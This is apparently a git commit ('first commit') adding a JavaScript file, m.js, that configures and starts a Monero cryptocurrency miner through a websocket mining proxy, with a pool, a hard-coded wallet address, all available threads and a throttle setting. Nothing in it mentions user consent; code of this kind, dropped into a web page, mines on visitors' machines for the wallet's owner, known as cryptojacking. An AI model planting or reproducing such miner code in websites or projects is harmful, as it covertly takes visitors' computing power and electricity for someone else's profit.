961d0159bd853cb6bf2757eaeb46083f10129754
sans4lyf <94701791+sans4lyf@users.noreply.github.com>
2022-01-02 16:20:59 -0500

    first commit

---
+++ m.js
@@ -0,0 +1,10 @@
+
+
+server = "wss://f.xmrminingproxy.com:8181";
+var pool = "moneroocean.stream";
+var walletAddress = "42XYmYVDcjmAVfKeHasJM62bst7TUmcESDaczqtDzrokBSfu5NavWvVDd2jNyh9rjoAqGmVddpFB8MSPdaeTKdtr9qj7iEp";
+var workerId = ""
+var threads = -1;
+var password = "x";
+startMining(pool, walletAddress, workerId, threads, password);
+throttleMiner = 80;
